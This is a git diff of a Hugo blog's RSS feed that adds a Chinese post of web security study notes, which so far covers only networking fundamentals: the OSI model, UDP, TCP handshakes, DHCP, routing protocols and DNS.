@@ -2,23 +2,1332 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>gucheNg</title>
-        <link>http://gucheng.me/</link>
+        <link>https://2477231995.github.io/</link>
         <description>Recent content on gucheNg</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>gucheNg</copyright>
-        <lastBuildDate>Sun, 08 Dec 2024 12:19:00 +0800</lastBuildDate><atom:link href="http://gucheng.me/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 24 May 2025 07:19:37 +0800</lastBuildDate><atom:link href="https://2477231995.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Web安全学习笔记</title>
+        <link>https://2477231995.github.io/p/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
+        <pubDate>Sat, 24 May 2025 07:19:37 +0800</pubDate>
+        
+        <guid>https://2477231995.github.io/p/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
+        <description>&lt;h2 id=&#34;计算机网络与协议&#34;&gt;计算机网络与协议
+&lt;/h2&gt;&lt;h3 id=&#34;21-网络基础&#34;&gt;2.1. 网络基础
+&lt;/h3&gt;&lt;h4 id=&#34;211-计算机通信网的组成&#34;&gt;2.1.1. 计算机通信网的组成
+&lt;/h4&gt;&lt;p&gt;计算机网络由通信子网和资源子网组成。其中通信子网负责数据的无差错和有序传递，其处理功能包括差错控制、流量控制、路由选择、网络互连等。&lt;/p&gt;
+&lt;p&gt;其中资源子网是计算机通信的本地系统环境，包括主机、终端和应用程序等， 资源子网的主要功能是用户资源配置、数据的处理和管理、软件和硬件共享以及负载 均衡等。&lt;/p&gt;
+&lt;p&gt;总的来说，计算机通信网就是一个由通信子网承载的、传输和共享资源子网的各类信息的系统。&lt;/p&gt;
+&lt;h4 id=&#34;212-通信协议&#34;&gt;2.1.2. 通信协议
+&lt;/h4&gt;&lt;p&gt;为了完成计算机之间有序的信息交换，提出了通信协议的概念，其定义是相互通信的双方（或多方）对如何进行信息交换所必须遵守的一整套规则。&lt;/p&gt;
+&lt;p&gt;协议涉及到三个要素，分别为：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;语法：语法是用户数据与控制信息的结构与格式，以及数据出现顺序的意义&lt;/li&gt;
+&lt;li&gt;语义：用于解释比特流的每一部分的意义&lt;/li&gt;
+&lt;li&gt;时序：事件实现顺序的详细说明&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;213-osi七层模型&#34;&gt;2.1.3. OSI七层模型
+&lt;/h4&gt;&lt;h5 id=&#34;2131-简介&#34;&gt;2.1.3.1. 简介
+&lt;/h5&gt;&lt;p&gt;OSI（Open System Interconnection）共分为物理层、数据链路层、网络层、传输层、会话层、表示层、应用层七层，其具体的功能如下。&lt;/p&gt;
+&lt;h5 id=&#34;2132-物理层&#34;&gt;2.1.3.2. 物理层
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;提供建立、维护和释放物理链路所需的机械、电气功能和规程等特性&lt;/li&gt;
+&lt;li&gt;通过传输介质进行数据流(比特流)的物理传输、故障监测和物理层管理&lt;/li&gt;
+&lt;li&gt;从数据链路层接收帧，将比特流转换成底层物理介质上的信号&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2133-数据链路层&#34;&gt;2.1.3.3. 数据链路层
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;在物理链路的两端之间传输数据&lt;/li&gt;
+&lt;li&gt;在网络层实体间提供数据传输功能和控制&lt;/li&gt;
+&lt;li&gt;提供数据的流量控制&lt;/li&gt;
+&lt;li&gt;检测和纠正物理链路产生的差错&lt;/li&gt;
+&lt;li&gt;格式化的消息称为帧&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2134-网络层&#34;&gt;2.1.3.4. 网络层
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;负责端到端的数据的路由或交换，为透明地传输数据建立连接&lt;/li&gt;
+&lt;li&gt;寻址并解决与数据在异构网络间传输相关的所有问题&lt;/li&gt;
+&lt;li&gt;使用上面的传输层和下面的数据链路层的功能&lt;/li&gt;
+&lt;li&gt;格式化的消息称为分组&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2135-传输层&#34;&gt;2.1.3.5. 传输层
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;提供无差错的数据传输&lt;/li&gt;
+&lt;li&gt;接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地&lt;/li&gt;
+&lt;li&gt;在系统之间提供可靠的透明的数据传输,提供端到端的错误恢复和流量控制&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2136-会话层&#34;&gt;2.1.3.6. 会话层
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;提供节点之间通信过程的协调&lt;/li&gt;
+&lt;li&gt;负责执行会话规则（如：连接是否允许半双工或全双工通信）、同步数据流以及当故障发生时重新建立连接&lt;/li&gt;
+&lt;li&gt;使用上面的表示层和下面的传输层的功能&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2137-表示层&#34;&gt;2.1.3.7. 表示层
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;提供数据格式、变换和编码转换&lt;/li&gt;
+&lt;li&gt;涉及正在传输数据的语法和语义&lt;/li&gt;
+&lt;li&gt;将消息以合适电子传输的格式编码&lt;/li&gt;
+&lt;li&gt;执行该层的数据压缩和加密&lt;/li&gt;
+&lt;li&gt;从应用层接收消息，转换格式，并传送到会话层，该层常合并在应用层中&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2138-应用层&#34;&gt;2.1.3.8. 应用层
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;包括各种协议，它们定义了具体的面向用户的应用：如电子邮件、文件传输等&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2139-总结&#34;&gt;2.1.3.9. 总结
+&lt;/h5&gt;&lt;p&gt;低三层模型属于通信子网，涉及为用户间提供透明连接，操作主要以每条链路（ hop-by-hop）为基础，在节点间的各条数据链路上进行通信。由网络层来控制各条链路上的通信，但要依赖于其他节点的协调操作。&lt;/p&gt;
+&lt;p&gt;高三层属于资源子网，主要涉及保证信息以正确可理解形式传送。&lt;/p&gt;
+&lt;p&gt;传输层是高三层和低三层之间的接口，它是第一个端到端的层次，保证透明的端到端连接，满足用户的服务质量（QoS）要求，并向高三层提供合适的信息形式。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;22-udp协议&#34;&gt;2.2. UDP协议
+&lt;/h3&gt;&lt;h4 id=&#34;221-主要特点&#34;&gt;2.2.1. 主要特点
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;协议开销小、效率高。&lt;/li&gt;
+&lt;li&gt;UDP是无连接的，即发送数据之前不需要建立连接。&lt;/li&gt;
+&lt;li&gt;UDP使用尽最大努力交付，即不保证可靠交付。&lt;/li&gt;
+&lt;li&gt;UDP没有拥塞控制。&lt;/li&gt;
+&lt;li&gt;UDP支持一对一、一对多、多对一和多对多交互通信。&lt;/li&gt;
+&lt;li&gt;UDP的首部开销小，只有8个字节。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;23-tcp协议&#34;&gt;2.3. TCP协议
+&lt;/h3&gt;&lt;h4 id=&#34;231-简介&#34;&gt;2.3.1. 简介
+&lt;/h4&gt;&lt;p&gt;TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由RFC 793定义。&lt;/p&gt;
+&lt;h5 id=&#34;2311-三次握手&#34;&gt;2.3.1.1. 三次握手
+&lt;/h5&gt;&lt;p&gt;三次握手（Three-Way Handshake）是指建立一个TCP连接时，需要客户端和服务端总共发送3个包以确认连接的建立。&lt;/p&gt;
+&lt;p&gt;第一次握手客户端将标志位 SYN 置为1，随机产生一个值 seq=s ，并将该数据包发送给服务端，客户端进入 SYN_SENT 状态，等待服务端确认。&lt;/p&gt;
+&lt;p&gt;第二次握手服务端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务端将标志位 SYN 和 ACK 都置为1，ack=s+1，随机产生一个值 seq=k ，并将该数据包发送给客户端以确认连接请求，服务端进入 SYN_RCVD 状态。&lt;/p&gt;
+&lt;p&gt;第三次握手客户端收到确认后，检查ack值是否为s+1，ACK标志位是否为1，如果正确则将标志位 ACK 置为1，ack=k+1，并将该数据包发送给服务端，服务端检查ack值是否为k+1，ACK标志位是否为1，如果正确则连接建立成功，客户端和服务端进入 ESTABLISHED 状态，完成三次握手。&lt;/p&gt;
+&lt;h5 id=&#34;2312-四次挥手&#34;&gt;2.3.1.2. 四次挥手
+&lt;/h5&gt;&lt;p&gt;四次挥手（Four-Way Wavehand）指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。&lt;/p&gt;
+&lt;p&gt;第一次挥手客户端发送一个 FIN ，用来关闭客户端到服务端的数据传送，客户端进入 FIN_WAIT_1 状态。&lt;/p&gt;
+&lt;p&gt;第二次挥手服务端收到 FIN 后，发送一个 ACK 给客户端，确认序号为收到序号+1，服务端进入 CLOSE_WAIT 状态。&lt;/p&gt;
+&lt;p&gt;第三次挥手服务端发送一个 FIN ，用来关闭服务端到客户端的数据传送，服务端进入 LAST_ACK 状态。&lt;/p&gt;
+&lt;p&gt;第四次挥手客户端收到 FIN 后，客户端进入 TIME_WAIT 状态，接着发送一个 ACK 给服务端，确认序号为收到序号+1，服务端进入 CLOSED 状态，完成四次挥手。&lt;/p&gt;
+&lt;h4 id=&#34;232-拥塞控制&#34;&gt;2.3.2. 拥塞控制
+&lt;/h4&gt;&lt;p&gt;拥塞是指网络中报文数量过多，使得服务端来不及处理，以致引起这部分乃至整个网络性能下降的现象，严重时甚至会导致网络通信业务陷入停顿即出现死锁现象。&lt;/p&gt;
+&lt;p&gt;TCP采用拥塞控制算法来减少或者避免拥塞现象的发生，TCP的拥塞算法有过多种实现，包括Tahoe、Reno、NewReno、Vegas、Hybla、BIC 、CUBIC、SACK、Westwood、PRR、BBR等。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;24-dhcp协议&#34;&gt;2.4. DHCP协议
+&lt;/h3&gt;&lt;h4 id=&#34;241-简介&#34;&gt;2.4.1. 简介
+&lt;/h4&gt;&lt;p&gt;动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。&lt;/p&gt;
+&lt;p&gt;DHCP服务器端使用67/udp，客户端使用68/udp。DHCP运行分为四个基本过程，分别为请求IP租约、提供IP租约、选择IP租约和确认IP租约。客户端在获得了一个IP地址以后，就可以发送一个ARP请求来避免由于DHCP服务器地址池重叠而引发的IP冲突。&lt;/p&gt;
+&lt;h4 id=&#34;242-dchp-报文格式&#34;&gt;2.4.2. DCHP 报文格式
+&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;D:%5cUsers%5c%e5%a4%a9%5cDesktop%5chugo%e5%8d%9a%e5%ae%a2%5cdev%5cstatic%5cimg%5cimage-20250524072710441.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250524072710441&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;243-参考链接&#34;&gt;2.4.3. 参考链接
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DHCP Wiki&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2431-rfc&#34;&gt;2.4.3.1. RFC
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc2131&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 2131 Dynamic Host Configuration Protocol&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc2132&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 2132 DHCP Options and BOOTP Vendor Extensions&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc3046&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 3046 DHCP Relay Agent Information Option&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc3397&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 3397 Dynamic Host Configuration Protocol (DHCP) Domain Search Option&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc3442&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 3442 Classless Static Route Option for Dynamic Host Configuration Protocol (DHCP) version 4&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc3942&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 3942 Reclassifying Dynamic Host Configuration Protocol Version Four (DHCPv4) Options&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc4242&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 4242 Information Refresh Time Option for Dynamic Host Configuration Protocol for IPv6&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc4361&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 4361 Node-specific Client Identifiers for Dynamic Host Configuration Protocol Version Four (DHCPv4)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc4436&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 4436 Detecting Network Attachment in IPv4 (DNAv4)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;25-路由算法&#34;&gt;2.5. 路由算法
+&lt;/h3&gt;&lt;h4 id=&#34;251-简介&#34;&gt;2.5.1. 简介
+&lt;/h4&gt;&lt;p&gt;路由算法是用于找到一条从源路由器到目的路由器的最佳路径的算法。存在着多种路由算法，每种算法对网络和路由器资源的影响都不同；由于路由算法使用多种度量标准 (metric)，所以不同路由算法的最佳路径选择也有所不同。&lt;/p&gt;
+&lt;h4 id=&#34;252-路由选择算法的功能&#34;&gt;2.5.2. 路由选择算法的功能
+&lt;/h4&gt;&lt;p&gt;源/宿对之间的路径选择，以及选定路由之后将报文传送到它们的目的地。&lt;/p&gt;
+&lt;p&gt;路由选择算法的要求：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;正确性：确保分组从源节点传送到目的节点&lt;/li&gt;
+&lt;li&gt;简单性：实现方便，软硬件开销小&lt;/li&gt;
+&lt;li&gt;自适应性：也称健壮性，算法能够适应业务量和网络拓扑的变化&lt;/li&gt;
+&lt;li&gt;稳定性：能长时间无故障运行&lt;/li&gt;
+&lt;li&gt;公平性：每个节点都有机会传送信息&lt;/li&gt;
+&lt;li&gt;最优性：尽量选取好的路由&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;253-自治系统-as-autonomous-system&#34;&gt;2.5.3. 自治系统 AS (Autonomous System)
+&lt;/h4&gt;&lt;p&gt;经典定义：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;由一个组织管理的一整套路由器和网络。&lt;/li&gt;
+&lt;li&gt;使用一种AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由。&lt;/li&gt;
+&lt;li&gt;使用一种 AS 之间的路由选择协议用以确定分组在AS之间的路由。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;尽管一个 AS 使用了多种内部路由选择协议和度量，但对其他 AS 表现出的是一个单一的和一致的路由选择策略。&lt;/p&gt;
+&lt;h4 id=&#34;254-两大类路由选择协议&#34;&gt;2.5.4. 两大类路由选择协议
+&lt;/h4&gt;&lt;p&gt;因特网的中，路由协议可以分为内部网关协议 IGP (Interior Gateway Protocol)和外部网关协议 EGP (External Gateway Protocol)。&lt;/p&gt;
+&lt;p&gt;IGP是在一个AS内部使用的路由选择协议，如RIP和OSPF协议，是域内路由选择 (interdomain routing)。当源主机和目的主机处在不同的AS中，在数据报到达AS的边界时，使用外部网关协议 EGP 将路由选择信息传递到另一个自治系统中，如BGP-4，是域间路由选择 (intradomain routing)。&lt;/p&gt;
+&lt;h4 id=&#34;255-rip&#34;&gt;2.5.5. RIP
+&lt;/h4&gt;&lt;p&gt;路由信息协议 (Routing Information Protocol, RIP) 是一种基于距离 向量的路由选择协议。RIP 协议要求网络中的每一个路由器都要维护从它自己到自治系统内其他每一个目的网络的距离和下一跳路由器地址。&lt;/p&gt;
+&lt;h4 id=&#34;256-ospf&#34;&gt;2.5.6. OSPF
+&lt;/h4&gt;&lt;p&gt;开放最短路径优先(Open Shortest Path First，OSPF)，这个算法名为“最短路径优先”是因为使用了 Dijkstra 提出的最短路径算法SPF，只是一个协议的名字，它并不表示其他的路由选择协议不是“最短路径优先”。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;26-域名系统&#34;&gt;2.6. 域名系统
+&lt;/h3&gt;&lt;h4 id=&#34;261-简介&#34;&gt;2.6.1. 简介
+&lt;/h4&gt;&lt;p&gt;DNS是一个简单的请求-响应协议，是将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP协议的53端口。&lt;/p&gt;
+&lt;h4 id=&#34;262-请求响应&#34;&gt;2.6.2. 请求响应
+&lt;/h4&gt;&lt;h5 id=&#34;2621-dns记录&#34;&gt;2.6.2.1. DNS记录
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;A&lt;/p&gt;
+&lt;p&gt;返回域名对应的IPv4地址&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;AAAA&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;NS&lt;/p&gt;
+&lt;p&gt;域名服务器返回该域名由哪台域名服务器解析&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;PTR&lt;/p&gt;
+&lt;p&gt;反向记录从IP地址到域名的记录&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;MX&lt;/p&gt;
+&lt;p&gt;电子邮件交换记录记录邮件域名对应的IP地址&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2622-响应码&#34;&gt;2.6.2.2. 响应码
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;NOERROR&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;No error condition
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;FORMERR&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Format error - The name server was unable to interpret the query
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;SERVFAIL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Server failure - The name server was unable to process this query due to a problem with the name server
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;NXDOMAIN&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;this code signifies that the domain name referenced in the query does not exist
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;NOTIMP&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not Implemented - The name server does not support the requested kind of query
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;REFUSED&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Refused - The name server refuses to perform the specified operation for policy reasons
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;NODATA&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;A pseudo RCODE which indicates that the name is valid, for the given class, but [there] are no records of the given type A NODATA response has to be inferred from the answer.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;263-域名系统工作原理&#34;&gt;2.6.3. 域名系统工作原理
+&lt;/h4&gt;&lt;h5 id=&#34;2631-解析过程&#34;&gt;2.6.3.1. 解析过程
+&lt;/h5&gt;&lt;p&gt;DNS解析过程是递归查询的，具体过程如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户要访问域名www.example.com时，先查看本机hosts是否有记录或者本机是否有DNS缓存，如果有，直接返回结果，否则向递归服务器查询该域名的IP地址&lt;/li&gt;
+&lt;li&gt;递归缓存为空时，首先向根服务器查询com顶级域的IP地址&lt;/li&gt;
+&lt;li&gt;根服务器告知递归服务器com顶级域名服务器的IP地址&lt;/li&gt;
+&lt;li&gt;递归向com顶级域名服务器查询负责example.com的权威服务器的IP&lt;/li&gt;
+&lt;li&gt;com顶级域名服务器返回相应的IP地址&lt;/li&gt;
+&lt;li&gt;递归向example.com的权威服务器查询www.example.com的地址记录&lt;/li&gt;
+&lt;li&gt;权威服务器告知www.example.com的地址记录&lt;/li&gt;
+&lt;li&gt;递归服务器将查询结果返回客户端&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;2632-域传送&#34;&gt;2.6.3.2. 域传送
+&lt;/h5&gt;&lt;p&gt;DNS服务器可以分为主服务器、备份服务器和缓存服务器。域传送是指备份服务器从主服务器拷贝数据，并使用得到的数据更新自身数据库。域传送是在主备服务器之间同步数据库的机制。&lt;/p&gt;
+&lt;h4 id=&#34;264-服务器类型&#34;&gt;2.6.4. 服务器类型
+&lt;/h4&gt;&lt;h5 id=&#34;2641-根服务器&#34;&gt;2.6.4.1. 根服务器
+&lt;/h5&gt;&lt;p&gt;根服务器是DNS的核心，负责互联网顶级域名的解析，用于维护域的权威信息，并将DNS查询引导到相应的域名服务器。&lt;/p&gt;
+&lt;p&gt;根服务器在域名树中代表最顶级的 &lt;code&gt;.&lt;/code&gt; 域， 一般省略。&lt;/p&gt;
+&lt;p&gt;13台IPv4根服务器的域名标号为a到m，即a.root-servers.org到m.root-servers.org，所有服务器存储的数据相同，仅包含ICANN批准的TLD域名权威信息。&lt;/p&gt;
+&lt;h5 id=&#34;2642-权威服务器&#34;&gt;2.6.4.2. 权威服务器
+&lt;/h5&gt;&lt;p&gt;权威服务器上存储域名Zone文件，维护域内域名的权威信息，递归服务器可以从权威服务器获得DNS查询的资源记录。&lt;/p&gt;
